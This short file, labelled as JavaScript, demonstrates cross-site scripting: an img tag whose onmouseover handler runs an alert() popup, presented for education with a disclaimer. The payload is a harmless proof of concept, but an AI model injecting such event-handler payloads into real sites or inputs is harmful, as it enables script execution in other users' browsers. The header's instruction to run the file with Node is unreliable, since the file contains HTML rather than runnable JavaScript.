// Created August 16th, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
// Run on Windows [ Node <path to file>\XSS_via_Event_Handlers_JavaScript.js ]
// XSS via Event Handlers = This makes the event of 'onmouseover' (hovering the mouse
// over an image) a trigger for a popup alert

<img src="#" onmouseover="alert('XSS via Event Handlers')">

// DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
